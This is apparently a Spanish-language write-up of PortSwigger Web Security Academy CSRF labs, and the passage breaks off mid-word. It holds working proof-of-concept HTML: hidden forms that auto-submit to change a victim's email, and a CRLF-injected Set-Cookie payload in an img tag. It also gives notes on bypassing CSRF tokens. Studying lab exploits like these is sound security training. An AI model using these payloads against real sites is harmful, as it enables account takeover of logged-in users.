---
title: CSRF | PortSwigger
---
Labs de Cross Site Request Forgery de PorSwigger hechos y explicados

### Lab: CSRF vulnerability with no defenses

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a29004703fe6654c256d41a0066008b.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="root&#64;root&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
<script>
document.forms[0].submit();
</script>
  </body>
</html>
<!-- De esta manera, creamos un boton submit que, sin que la victma lo vea (por eso el input type está en hidden), le cambia su direccion de email a root@root.com.
Como la victima está autenticada (por la cookie), el ataque se ejecuta automáticamente, entrando en juego el: -->
<script>
document.forms[0].submit();
</script>
<!-- El cual se utiliza para enviar automáticamente el formulario HTML oculto en nombre del usuario víctima cuando se carga la página web del atacante.. ejecutando la request como si fuese la victima.
```

### Lab: CSRF where token validation depends on request method

```
<!-- Hacemos lo mismo que en el paso anterior, pero esta vez cambiando el método de POST a GET -->
```
-------
### Lab: CSRF where token validation depends on token being present

```
<!-- Simplemente borramos el parámetro token CSRF de abajo de la request. De esta manera, bypaseamos el check.
```
--------
### Lab: CSRF where token is not tied to user session

```
<!-- El token CSRF de carlos vale para wiener y vice versa. por lo tanto, si introducimos el token de uno en la request del otro, inmediatamente le cambiaremos su correo.
```
------------
### Lab: CSRF where token is tied to non-session cookie


```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a6000100437b01ac057eb5100fc00cd.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="p&#64;p&#46;com" />
      <input type="hidden" name="csrf" value="xgXn23NMo7bKzEl4zJijZAAbOVmZ4jWc" />
      <input type="submit" value="Submit request" />
    </form>
<img src="https://0a6000100437b01ac057eb5100fc00cd.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=uibjEDETvHe2pRq2eXcUvTb08ft3cdsk%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
<!-- En este caso, el csrf va ligado al csrf token. Si cambias uno sin cambiar el otro, te tira error. No obstante, si cambiamos ambos campos por los del usuario carlos, si que funciona. 
Por lo tanto, aplicaremos el mismo ataque que antes. No obstante, necesitamos agregarle la csrf cookie. Para ello, tenemos este trozo de código: -->
?search=test%0d%0aSet-Cookie:%20csrfKey=uibjEDETvHe2pRq2eXcUvTb08ft3cdsk%3b%20SameSite=None
<!-- El cual se encargará de hacerlo. (Importante: Meter la cookie del usuario atacante, así como el csrf key). Finalmente, dentro del <img src> hacemos una request a search (Como si buscaramos algo en la barra de busqueda de la página principal) para cargar la cookie y, como esa imagen no existe, el error se activará y le cambiará el correo al usuario victima.
```
--------
### Lab: CSRF where token is duplicated in cookie

```
<!-- Lo mismo que antes, pero ahora, en lugar de hacer Cookie:%20csrfKey en el img src, cambiam
```